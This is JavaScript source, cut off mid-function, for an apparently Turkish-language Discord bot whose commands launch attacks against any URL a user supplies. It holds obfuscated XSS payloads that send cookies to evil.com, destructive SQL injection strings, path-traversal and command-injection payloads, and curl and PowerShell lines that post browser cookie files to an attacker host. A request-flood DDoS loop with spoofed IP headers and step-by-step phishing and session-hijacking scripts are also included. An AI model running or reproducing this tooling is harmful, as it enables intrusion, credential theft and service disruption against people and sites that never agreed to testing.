import { updateInteraction, sendResponse, safeFetch, safeJSON, truncate, delay } from '../utils/helpers.js';

const _atob = b => new TextDecoder().decode(new Uint8Array([...atob(b)].map(c => c.charCodeAt(0))));

export async function handleCookiesBot(interaction, request, env, ctx) {
	if (interaction.type === 1) {
		return new Response(JSON.stringify({ type: 1 }), { headers: { 'Content-Type': 'application/json' } });
	}

	if (interaction.type === 2) {
		const { name, options } = interaction.data;
		const getOption = (optName) => options?.find(o => o.name === optName)?.value;

		const nl = '\n';
		const bt = '`';

		switch (name) {

			// ==================== O T U R U M   C A L M A ====================
			case 'oturum-cal':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Oturum Calma (Session Hijacking) Analizi:** ${url}${nl}${nl}`;

						const base = url.startsWith('http') ? url : 'https://' + url;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const headers = res.headers;
						const body = await res.text().catch(() => '');

						result += `**1. Cookie Analizi:**${nl}`;
						const setCookie = headers.get('set-cookie');
						if (setCookie) {
							const flags = [];
							if (setCookie.includes('HttpOnly')) flags.push('HttpOnly [OK]');
							else flags.push('HttpOnly [EKSIK] - JavaScript erisimi mumkun!');
							if (setCookie.includes('Secure')) flags.push('Secure [OK]');
							else flags.push('Secure [EKSIK] - HTTP uzerinden gonderilebilir!');
							if (setCookie.includes('SameSite')) flags.push('SameSite [OK]');
							else flags.push('SameSite [EKSIK] - CSRF ile calinabilir!');
							result += flags.join(nl) + nl + nl;
							result += `**Raw Cookie:** ${bt}${setCookie.slice(0, 200)}${bt}${nl}${nl}`;
						} else {
							result += `Set-Cookie headeri yok.${nl}${nl}`;
						}

						result += `**2. Session Token Kalibi:**${nl}`;
						const sessPatterns = ['PHPSESSID', 'JSESSIONID', 'ASP.NET_SessionId', 'session', 'sid', 'token', 'jwt'];
						sessPatterns.forEach(p => {
							if (setCookie && setCookie.toLowerCase().includes(p.toLowerCase())) {
								result += `  [BULUNDU] ${p}${nl}`;
							}
						});
						if (!setCookie || !sessPatterns.some(p => setCookie.toLowerCase().includes(p.toLowerCase()))) {
							result += `  Standart session tokeni tespit edilemedi.${nl}`;
						}

						result += `${nl}**3. Oturum Calma Yontemleri:**${nl}`;
						result += `  - XSS ile document.cookie calma${nl}`;
						result += `  - MITM ile ag uzerinde sniffing${nl}`;
						result += `  - Session fixation (sabit oturum atama)${nl}`;
						result += `  - Cookie'yi localStorage'dan calma${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Oturum calma hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== X S S ====================
			case 'xss-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						const param = getOption('param') || 'q';
						let result = `**XSS - Cookie Calma Taramasi:** ${url}${nl}${nl}`;
						const baseUrl = url.includes('?') ? url : url + `?${param}=1`;
						const [basePart, qs] = baseUrl.split('?');
						const params = new URLSearchParams(qs);
						const val = params.get(param) || '1';

						const xssPayloads = [
							{ n: 'Script Cookie', p: _atob('PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS8/Yz0nK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4=') },
							{ n: 'Img Onerror', p: _atob('PGltZyBzcmM9eCBvbmVycm9yPSJmZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS8/Yz0nK2RvY3VtZW50LmNvb2tpZSkiPg==') },
							{ n: 'Svg Onload', p: _atob('PHN2Zy9vbmxvYWQ9ImZldGNoKCdodHRwczovL2V2aWwuY29tLz9jPScrZG9jdW1lbnQuY29va2llKSI+') },
							{ n: 'Body Onload', p: _atob('PGJvZHkgb25sb2FkPSJmZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS8/Yz0nK2RvY3VtZW50LmNvb2tpZSkiPg==') },
							{ n: 'Input Onfocus', p: _atob('PGlucHV0IGF1dG9mb2N1cyBvbmZvY3VzPSJmZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS8/Yz0nK2RvY3VtZW50LmNvb2tpZSkiPg==') },
							{ n: 'Marquee Onstart', p: _atob('PG1hcnF1ZWUgb25zdGFydD0iZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vP2M9Jytkb2N1bWVudC5jb29raWUpIj4=') },
							{ n: 'Polyglot XSS', p: _atob('Iic+PHN2ZyBvbmxvYWQ9ImZldGNoKCdodHRwczovL2V2aWwuY29tLz9jPScrZG9jdW1lbnQuY29va2llKSI+') },
							{ n: 'Details Toggle', p: _atob('PGRldGFpbHMgb3BlbiBvbnRvZ2dsZT0iZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vP2M9Jytkb2N1bWVudC5jb29raWUpIj4=') },
							{ n: 'Style XSS', p: _atob('PC9zdHlsZT48c2NyaXB0PmZldGNoKCdodHRwczovL2V2aWwuY29tLz9jPScrZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==') },
							{ n: 'JS URI', p: _atob('amF2YXNjcmlwdDpmZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS8/Yz0nK2RvY3VtZW50LmNvb2tpZSk=') },
						];

						const findings = [];
						for (const pl of xssPayloads) {
							try {
								const testUrl = basePart + '?' + new URLSearchParams({ ...Object.fromEntries(params), [param]: val + pl.p }).toString();
								const r = await safeFetch(testUrl, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' }, 5000);
								const body = await r.text().catch(() => '');
								if (body.includes(pl.p)) findings.push({ n: pl.n, r: 'Yansidi [KRITIK]' });
								else if (body.toLowerCase().includes('fetch(') || body.toLowerCase().includes('document.cookie')) findings.push({ n: pl.n, r: 'Potansiyel DOM tabanli [UYARI]' });
							} catch (e) { /* timeout */ }
						}

						result += findings.length > 0
							? `[ALARM] **${findings.length} XSS bulgusu!**${nl}${nl}${findings.map(f => `${f.n}: ${f.r}`).join(nl)}`
							: `[OK] Dogrudan XSS yansimasi tespit edilemedi.${nl}`;

						result += `${nl}${nl}**Cookie Calma Payload Ornegi:**${nl}`;
						result += `\`\`\`javascript${nl}<script>fetch('https://YOUR-WORKER.workers.dev/steal?c='+document.cookie)</script>${nl}\`\`\`${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `XSS tarama hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C S R F ====================
			case 'csrf-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**CSRF Guvenlik Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const body = await res.text().catch(() => '');
						const headers = res.headers;

						result += `**1. Cookie SameSite Analizi:**${nl}`;
						const setCookie = headers.get('set-cookie') || '';
						if (setCookie.includes('SameSite=Strict')) result += `  SameSite=Strict [OK] - En guvenli${nl}`;
						else if (setCookie.includes('SameSite=Lax')) result += `  SameSite=Lax [OK] - GET isteklerinde guvenli${nl}`;
						else if (setCookie.includes('SameSite=None')) result += `  SameSite=None [UYARI] - Secure olmali!${nl}`;
						else result += `  SameSite YOK [ZAFIYET] - CSRF ataklarina acik!${nl}`;

						result += `${nl}**2. Form Analizi:**${nl}`;
						const forms = body.match(/<form[^>]*>/gi) || [];
						if (forms.length > 0) {
							forms.forEach((form, i) => {
								const hasToken = form.includes('csrf') || form.includes('token') || form.includes('nonce') || form.includes('_wpnonce');
								result += `  Form ${i + 1}: CSRF token ${hasToken ? '[VAR]' : '[YOK - ZAFIYET]'}${nl}`;
								if (!hasToken) {
									const action = form.match(/action=["']([^"']+)["']/i)?.[1] || '?';
									const method = form.match(/method=["']([^"']+)["']/i)?.[1] || 'GET';
									result += `    Action: ${action} | Method: ${method}${nl}`;
								}
							});
						} else {
							result += `  Form bulunamadi.${nl}`;
						}

						result += `${nl}**3. Anti-CSRF Header Kontrolu:**${nl}`;
						const csrfHeaders = ['x-csrf-token', 'x-xsrf-token', 'x-requested-with'];
						csrfHeaders.forEach(h => {
							const val = headers.get(h);
							result += `  ${h}: ${val ? '[MEVCUT] ' + val.slice(0, 30) : '[YOK]'}${nl}`;
						});

						result += `${nl}**4. Origin/Referer Kontrolu:**${nl}`;
						const originRes = await safeFetch(base, {
							headers: { 'Origin': 'https://evil.com', 'Referer': 'https://evil.com/fake' },
							redirect: 'manual'
						}, 6000);
						result += `  Sahte Origin ile: HTTP ${originRes.status}${nl}`;
						if (originRes.status < 400) result += `  [UYARI] Origin kontrolu yok - sahte origin kabul ediliyor!${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `CSRF analiz hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== S Q L   E N J E K S I Y O N U ====================
			case 'sql-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						const param = getOption('param') || 'id';
						let result = `**SQL Enjeksiyonu - Cookie/Session Calma:** ${url}${nl}${nl}`;
						const baseUrl = url.includes('?') ? url : url + `?${param}=1`;
						const [basePart, qs] = baseUrl.split('?');
						const params = new URLSearchParams(qs);
						const val = params.get(param) || '1';

						const payloads = [
							{ n: 'Union Select Users', p: _atob('JyBVTklPTiBTRUxFQ1QgdXNlcm5hbWUscGFzc3dvcmQsZW1haWwgRlJPTSB1c2Vycy0tIC0='), s: 'union' },
							{ n: 'Error Extract DB', p: _atob('JyBBTkQgRVhUUkFDVFZBTFVFKDEsQ09OQ0FUKDB4N2UsZGF0YWJhc2UoKSkpLS0='), s: 'error' },
							{ n: 'Blind AND', p: _atob('JyBBTkQgMT0xLS0='), s: 'blind' },
							{ n: 'Time Sleep', p: _atob('JyBBTkQgU0xFRVAoMyktLQ=='), s: 'time' },
							{ n: 'Stacked Query', p: _atob('JzsgRFJPUCBUQUJMRSB1c2VyczsgU0VMRUNUICogRlJPTSB1c2Vycy0t'), s: 'stacked' },
							{ n: 'Group Concat Tables', p: _atob('JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcy0t'), s: 'union' },
							{ n: 'Into Outfile', p: _atob('JzsgU0VMRUNUICogSU5UTyBPVVRGSUxFICcvdmFyL3d3dy9odG1sL2R1bXAucGhwJyBGUk9NIHVzZXJzLS0='), s: 'file' },
							{ n: 'Order By Detect', p: _atob('JyBPUkRFUiBCWSAxMC0t'), s: 'error' },
						];

						const findings = [];
						for (const pl of payloads) {
							try {
								const testUrl = basePart + '?' + new URLSearchParams({ ...Object.fromEntries(params), [param]: val + pl.p }).toString();
								const t1 = Date.now();
								const r = await safeFetch(testUrl, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' }, 5000);
								const elapsed = Date.now() - t1;
								const body = await r.text().catch(() => '');
								const markers = ['sql', 'mysql', 'syntax error', 'unknown column', 'odbc', 'driver', 'database error', 'unclosed quotation', 'pg_query', 'ORA-'];
								const hasError = markers.some(m => body.toLowerCase().includes(m));
								const isTimeBased = pl.s === 'time' && elapsed > 2500;

								if (isTimeBased) findings.push({ n: pl.n, r: `Zaman tabanli! (${elapsed}ms) [KRITIK]` });
								else if (hasError) findings.push({ n: pl.n, r: `SQL hatasi tespit edildi! [KRITIK]` });
								else if (pl.s === 'blind' && r.status === 200) findings.push({ n: pl.n, r: `Potansiyel Blind [UYARI]` });
								if (pl.s === 'file' && body.includes('dump')) findings.push({ n: pl.n, r: `Outfile calisiyor olabilir! [ALARM]` });
							} catch (e) { /* timeout */ }
						}

						result += findings.length > 0
							? `[ALARM] **${findings.length} SQL bulgusu!**${nl}${nl}${findings.map(f => `${f.n}: ${f.r}`).join(nl)}`
							: `[OK] SQLi tespit edilemedi.${nl}`;

						result += `${nl}${nl}**Session Calma Zinciri:**${nl}`;
						result += `  1. SQLi ile admin paneline eris${nl}`;
						result += `  2. users tablosundan session_token cek${nl}`;
						result += `  3. Cookie'yi clone'layip oturum cal${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `SQLi tarama hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== K I M L I K   A V I ====================
			case 'kimlik-avi':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						const marka = getOption('marka') || 'Genel';
						let result = `**Kimlik Avi (Phishing) Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const body = await res.text().catch(() => '');
						const headers = res.headers;

						result += `**1. Sayfa Icerik Analizi:**${nl}`;
						const hasLogin = /login|signin|giris|kullanici/i.test(body);
						const hasPassword = /password|sifre|parola|type=["']password["']/i.test(body);
						const hasSubmit = /submit|gonder|button.*type=["']submit["']/i.test(body);
						result += `  Login Formu: ${hasLogin ? '[VAR]' : '[YOK]'}${nl}`;
						result += `  Sifre Alani: ${hasPassword ? '[VAR]' : '[YOK]'}${nl}`;
						result += `  Submit Butonu: ${hasSubmit ? '[VAR]' : '[YOK]'}${nl}`;

						result += `${nl}**2. Phishing Tespiti:**${nl}`;
						const domain = new URL(base).hostname;
						const suspiciousTLDs = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', '.work', '.date'];
						const hasSuspiciousTLD = suspiciousTLDs.some(tld => domain.endsWith(tld));
						if (hasSuspiciousTLD) result += `  [UYARI] Supheli TLD kullaniliyor!${nl}`;

						const isHTTPS = base.startsWith('https');
						result += `  HTTPS: ${isHTTPS ? '[VAR]' : '[YOK - UYARI]'}${nl}`;

						const formAction = body.match(/<form[^>]*action=["']([^"']+)["']/i)?.[1] || '';
						if (formAction && !formAction.startsWith('http')) {
							result += `  Form Action: ${formAction}${nl}`;
						}

						result += `${nl}**3. Kimlik Avi Korumasi:**${nl}`;
						result += `  - Domain yasini kontrol et (WHOIS)${nl}`;
						result += `  - SSL sertifikasi gecerli mi?${nl}`;
						result += `  - Marka taklit ediliyor: ${marka}${nl}`;
						result += `  - URL'de typosquat var mi?${nl}`;

						result += `${nl}**4. Cookie Calma Senaryosu:**${nl}`;
						result += `  1. Sahte ${marka} login sayfasi olustur${nl}`;
						result += `  2. Kullanici bilgilerini yakala${nl}`;
						result += `  3. Gercek siteye yonlendirip session cookie'yi al${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Phishing analiz hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== Y O L   G E C I S I ====================
			case 'yol-gecis':
				ctx.waitUntil((async () => {
					try {
						const domain = getOption('domain');
						let result = `**Yol Gecisi (Path Traversal) Taramasi:** ${domain}${nl}${nl}`;
						const base = domain.startsWith('http') ? domain : 'https://' + domain;

						const traversalPayloads = [
							'../../../etc/passwd',
							'..%2f..%2f..%2fetc%2fpasswd',
							'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
							'....//....//....//etc/passwd',
							'..%252f..%252f..%252fetc/passwd',
							'/etc/passwd',
							'C:\\Windows\\System32\\drivers\\etc\\hosts',
							'..\\..\\..\\windows\\win.ini',
							'file:///etc/passwd',
							'....\\/....\\/....\\/etc/passwd',
						];

						result += `**1. Yol Gecisi Denemeleri:**${nl}`;
						const findings = [];
						for (const payload of traversalPayloads) {
							try {
								const r = await safeFetch(`${base}/${payload}`, {
									headers: { 'User-Agent': 'Mozilla/5.0' },
									redirect: 'manual'
								}, 5000);
								const body = await r.text().catch(() => '');
								const isPasswd = body.includes('root:') && body.includes('/bin/');
								const isWin = body.includes('[fonts]') || body.includes('[extensions]') || body.includes('MS-DOS');
								if (isPasswd) findings.push(`[KRITIK] /etc/passwd okunabiliyor!`);
								else if (isWin) findings.push(`[KRITIK] Windows sistem dosyasi okunabiliyor!`);
								else if (r.status === 200 && body.length > 100 && body !== '') findings.push(`[UYARI] Payload ${payload.slice(0, 30)}... HTTP 200, icerik mevcut`);
							} catch (e) { /* timeout */ }
						}

						if (findings.length > 0) {
							result += findings.join(nl) + nl;
						} else {
							result += `  Dogrudan path traversal tespit edilemedi.${nl}`;
						}

						result += `${nl}**2. Cookie Dosyasi Hedefleri:**${nl}`;
						const cookieTargets = [
							{ os: 'Chrome Windows', path: '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies' },
							{ os: 'Firefox Windows', path: '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite' },
							{ os: 'Chrome Linux', path: '~/.config/google-chrome/Default/Cookies' },
							{ os: 'Firefox Linux', path: '~/.mozilla/firefox/*.default/cookies.sqlite' },
							{ os: 'Safari macOS', path: '~/Library/Cookies/Cookies.binarycookies' },
						];
						cookieTargets.forEach(t => result += `  ${t.os}: ${bt}${t.path}${bt}${nl}`);

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Path traversal hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C L I C K J A C K I N G ====================
			case 'clickjack-cookie':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Clickjacking Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const headers = res.headers;

						result += `**1. Header Kontrolu:**${nl}`;
						const xfo = headers.get('x-frame-options');
						const csp = headers.get('content-security-policy');

						if (xfo) {
							result += `  X-Frame-Options: ${xfo} [OK]${nl}`;
						} else {
							result += `  X-Frame-Options: YOK [ZAFIYET]${nl}`;
						}

						if (csp) {
							const hasFrameAncestors = csp.includes('frame-ancestors');
							result += `  CSP: ${hasFrameAncestors ? 'frame-ancestors mevcut [OK]' : 'frame-ancestors YOK [UYARI]'}${nl}`;
						} else {
							result += `  CSP: YOK [ZAFIYET]${nl}`;
						}

						const zafiyet = !xfo && (!csp || !csp.includes('frame-ancestors'));
						result += `${nl}**2. Sonuc:** `;
						if (zafiyet) {
							result += `Site iframe icine yuklenebilir - Clickjacking'e ACIK!${nl}${nl}`;
						} else {
							result += `Site korumali gorunuyor.${nl}${nl}`;
						}

						result += `**3. Cookie Calma Saldirisi Senaryosu:**${nl}`;
						result += `  1. Hedef siteyi seffaf iframe'de yukle${nl}`;
						result += `  2. Ustune sahte butonlar yerlestir${nl}`;
						result += `  3. Kullanici tikladiginda JS ile cookie'yi cal${nl}`;
						result += `${nl}**4. Iframe Test Kodu:**${nl}`;
						result += `\`\`\`html${nl}<iframe src="${base}" width="100%" height="500"></iframe>${nl}<script>${nl}setTimeout(()=>{${nl}  try{${nl}    alert(document.cookie);${nl}  }catch(e){console.log('Same-origin policy korumasi var')}${nl}},3000)${nl}</script>${nl}\`\`\``;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Clickjacking hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== A C I K   Y O N L E N D I R M E ====================
			case 'acik-yonlendirme':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Acik Yonlendirme Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						const redirectParams = ['url', 'redirect', 'next', 'goto', 'return', 'returnTo', 'returnUrl', 'target', 'dest', 'destination', 'continue', 'forward', 'redir'];
						const testUrl = 'https://evil.com/steal-cookie';

						result += `**1. Yonlendirme Parametre Testi:**${nl}`;
						let zafiyetSayisi = 0;
						for (const param of redirectParams) {
							try {
								const sep = base.includes('?') ? '&' : '?';
								const testTarget = `${base}${sep}${param}=${encodeURIComponent(testUrl)}`;
								const r = await safeFetch(testTarget, {
									headers: { 'User-Agent': 'Mozilla/5.0' },
									redirect: 'manual'
								}, 5000);
								const location = r.headers.get('location');
								if (location && location.includes('evil.com')) {
									result += `  [ZAFIYET] ${param}=evil.com -> ${r.status} yonlendirme${nl}`;
									zafiyetSayisi++;
								} else if (location) {
									result += `  [GUVENLI] ${param} -> ${location.slice(0, 40)}${nl}`;
								}
							} catch (e) { /* timeout */ }
						}

						result += `${nl}**2. Cookie Calma Senaryosu:**${nl}`;
						result += `  1. Acik yonlendirme bulan saldirgan:${nl}`;
						result += `     ${base}?redirect=https://evil.com${nl}`;
						result += `  2. evil.com'da kullaniciya "oturumun sonlandi" deyip login iste${nl}`;
						result += `  3. Kullanici login olunca cookie'yi kaydet${nl}`;
						result += `  4. Gercek siteye yonlendir${nl}`;

						if (zafiyetSayisi === 0) {
							result += `${nl}[OK] Acik yonlendirme tespit edilemedi.${nl}`;
						}

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Yonlendirme hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== K O M U T   E N J E K S I Y O N U ====================
			case 'komut-enjeksiyon':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Komut Enjeksiyonu Taramasi:** ${url}${nl}${nl}`;

						const cmdPayloads = [
							{ n: 'Basic CMD', p: '; id; whoami; uname -a', os: 'linux' },
							{ n: 'Pipe CMD', p: '| id | whoami', os: 'linux' },
							{ n: 'Backtick CMD', p: '`id` `whoami`', os: 'linux' },
							{ n: 'Dollar CMD', p: '$(id) $(whoami)', os: 'linux' },
							{ n: 'AND CMD', p: '&& id && whoami', os: 'linux' },
							{ n: 'OR CMD', p: '|| id || whoami', os: 'linux' },
							{ n: 'Newline CMD', p: '\nid\nwhoami', os: 'linux' },
							{ n: 'Windows CMD', p: '& dir & whoami', os: 'win' },
							{ n: 'PowerShell', p: '| powershell Get-Process', os: 'win' },
							{ n: 'Base64 CMD', p: _atob('OyBlY2hvICRIT01F'), os: 'linux' },
						];

						const base = url.includes('?') ? url : url + '?cmd=test';
						const [basePart, qs] = base.split('?');
						const params = new URLSearchParams(qs);
						const cmdParamName = [...params.keys()][0] || 'cmd';
						const cmdVal = params.get(cmdParamName) || 'test';

						result += `**1. Komut Enjeksiyon Denemeleri (param: ${cmdParamName}):**${nl}`;
						const findings = [];
						for (const pl of cmdPayloads) {
							try {
								const testUrl = basePart + '?' + new URLSearchParams({ ...Object.fromEntries(params), [cmdParamName]: cmdVal + pl.p }).toString();
								const r = await safeFetch(testUrl, {
									headers: { 'User-Agent': 'Mozilla/5.0' },
									redirect: 'manual'
								}, 5000);
								const body = await r.text().catch(() => '');
								if (pl.os === 'linux' && (body.includes('uid=') || body.includes('root') || body.includes('/home/'))) {
									findings.push(`[KRITIK] ${pl.n}: Linux komut ciktisi tespit edildi!`);
								} else if (pl.os === 'win' && (body.toLowerCase().includes('windows') || body.toLowerCase().includes('nt authority'))) {
									findings.push(`[KRITIK] ${pl.n}: Windows komut ciktisi tespit edildi!`);
								}
							} catch (e) { /* timeout */ }
						}

						result += findings.length > 0
							? `[ALARM] ${findings.join(nl)}${nl}${nl}`
							: `[OK] Dogrudan komut ciktisi tespit edilemedi.${nl}${nl}`;

						result += `**2. Cookie Calma Komut Senaryosu:**${nl}`;
						result += `  Linux:${nl}`;
						result += `    ; curl -X POST -d "\$(cat /tmp/session_cookie)" https://evil.com/steal${nl}`;
						result += `  Windows:${nl}`;
						result += `    & powershell -c "Invoke-WebRequest -Uri https://evil.com/steal -Method POST -Body (Get-Content \$env:APPDATA\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies)"${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Komut enjeksiyon hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== D D O S ====================
			case 'ddos-cookie':
				ctx.waitUntil((async () => {
					try {
						const hedef = getOption('hedef');
						const sure = Math.min(Math.max(getOption('sure') || 5, 1), 15);
						const metod = (getOption('metod') || 'GET').toUpperCase();
						let result = `**DDoS Stres Testi:** ${hedef}${nl}${nl}`;
						const url = hedef.startsWith('http') ? hedef : 'http://' + hedef;

						result += `**Saldiri Parametreleri:**${nl}`;
						result += `  Hedef: ${url}${nl}`;
						result += `  Sure: ${sure} saniye${nl}`;
						result += `  Metod: ${metod}${nl}${nl}`;

						result += `**1. Saldiri Baslatiliyor...**${nl}`;
						const end = Date.now() + sure * 1000;
						let ok = 0, block = 0, errCount = 0;

						while (Date.now() < end) {
							await Promise.allSettled(Array.from({ length: 15 }, () =>
								fetch(`${url}/?t=${Date.now()}&r=${Math.random()}`, {
									method: metod,
									headers: {
										'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
										'Accept': 'text/html,application/xhtml+xml',
										'Cache-Control': 'no-cache',
										'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
									},
									redirect: 'manual'
								}).then(r => r.status < 400 ? ok++ : block++).catch(() => errCount++)
							));
							await delay(50);
						}

						result += `**2. Sonuc:**${nl}`;
						result += `  Basarili Istek: ${ok}${nl}`;
						result += `  Engellenen: ${block}${nl}`;
						result += `  Hata: ${errCount}${nl}`;
						result += `  Toplam: ${ok + block + errCount} istek / ${sure}s${nl}${nl}`;

						result += `**3. Cookie Tabanli DDoS Senaryosu:**${nl}`;
						result += `  - Session cookie'yi al${nl}`;
						result += `  - Cookie ile authenticate olup istek at${nl}`;
						result += `  - 1000 concurrent session ile sunucuyu zorla${nl}`;
						result += `  - Her istekte farkli cookie/UA/IP kullan${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `DDoS hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== C O O K I E   M A N I P U L E ====================
			case 'cookie-manipule':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Cookie Manipulasyonu & Privilege Escalation:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Cookie Degistirme Testi:**${nl}`;
						const manipules = [
							{ c: 'admin=true', d: 'Admin flag' },
							{ c: 'role=admin', d: 'Role admin' },
							{ c: 'user_level=1', d: 'User level 1' },
							{ c: 'is_admin=1', d: 'is_admin flag' },
							{ c: 'auth_level=9', d: 'Auth level 9' },
							{ c: 'admin=1; role=admin; user_level=1', d: 'Kombine' },
						];
						const baseRes = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const baseBody = await baseRes.text().catch(() => '');
						const baseLen = baseBody.length;

						for (const m of manipules) {
							try {
								const r = await safeFetch(base, {
									headers: { 'User-Agent': 'Mozilla/5.0', 'Cookie': m.c },
									redirect: 'manual'
								}, 5000);
								const body = await r.text().catch(() => '');
								const statusDiff = r.status !== baseRes.status ? ` [STATUS: ${r.status}]` : '';
								const lenDiff = Math.abs(body.length - baseLen) > 50 ? ` [LEN farki: ${body.length}]` : '';
								const diff = statusDiff || lenDiff || ' Yanit ayni';
								result += `  ${m.d}:${diff}${nl}`;
							} catch (e) { result += `  ${m.d}: Hata - ${e.message}${nl}`; }
						}

						result += `${nl}**2. Privilege Escalation Adimlari:**${nl}`;
						result += `  1. Developer console'da ${bt}document.cookie${bt} incele${nl}`;
						result += `  2. Cookie'yi duzenle: ${bt}document.cookie="role=admin; path=/"${bt}${nl}`;
						result += `  3. Sayfayi yenile ve yetki degisimini kontrol et${nl}`;
						result += `  4. Session cookie'yi decode et (Base64/JWT)${nl}`;
						result += `  5. JWT payload'ini duzenleyip yeniden imzala (secret bulunmali)${nl}`;
						result += `${nl}**3. Araclar:**${nl}`;
						result += `  - EditThisCookie (Chrome)${nl}`;
						result += `  - Cookie-Editor (Firefox)${nl}`;
						result += `  - curl -H "Cookie: admin=true" ${base}${nl}`;

						await updateInteraction(interaction.application_id, interaction.token, { content: truncate(result) });
					} catch (err) {
						await updateInteraction(interaction.application_id, interaction.token, { content: `Cookie manipule hatasi: ${err.message}` });
					}
				})());
				return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

			// ==================== S E S S I O N   F I X A T I O N ====================
			case 'session-fixation':
				ctx.waitUntil((async () => {
					try {
						const url = getOption('url');
						let result = `**Session Fixation Analizi:** ${url}${nl}${nl}`;
						const base = url.startsWith('http') ? url : 'https://' + url;

						result += `**1. Session Tespiti:**${nl}`;
						const res = await safeFetch(base, { headers: { 'User-Agent': 'Mozilla/5.0' } }, 8000);
						const setCookie = res.headers.get('set-cookie') || '';
